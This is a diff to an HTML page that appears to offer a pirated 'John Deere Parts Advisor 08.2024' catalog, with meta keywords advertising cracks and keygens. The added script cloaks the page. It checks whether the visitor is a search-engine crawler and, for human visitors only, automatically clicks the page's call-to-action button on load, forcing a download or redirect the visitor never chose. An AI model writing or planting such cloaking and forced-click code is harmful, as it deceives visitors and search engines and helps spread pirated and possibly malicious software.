@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>John Deere Parts Advisor 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="John Deere Parts Advisor 08.2024 catalog helps find, identify, order spare parts for agriculture, construction, forestry. Available on Windows 10/8/7.">
     <meta name="keywords" content="John Deere Parts Advisor 08.2024, John Deere parts catalog 2024, John Deere spare parts catalog, John Deere Parts Advisor download, John Deere Parts Advisor free download, John Deere Parts Advisor high speed download, John Deere parts software download, John Deere parts software crack, John Deere parts software keygen, John Deere parts agricultural, John Deere parts construction, John Deere parts forestry, John Deere parts Windows 10, John Deere parts Windows 8, John Deere parts Windows 7, catalogue free download, каталог запчастей John Deere бесплатно скачать, каталог запчастей John Deere скачать, каталог запчастей John Deere 2024, каталог запчастей John Deere windows, каталог запчастей John Deere для сельскохозяйства, каталог запчастей John Deere для строительной техники, каталог запчастей John Deere для лесной техники, John Deere 2024 catalog, John Deere Parts Advisor 2024 free download, John Deere spare parts catalog pdf, John Deere parts advisor software, John Deere parts advisor software download free, John Deere Parts Advisor 2024 download free, John Deere parts catalog pdf, John Deere parts catalog free download, John Deere spare parts catalog 2024, John Deere equipment parts download">
     <style>
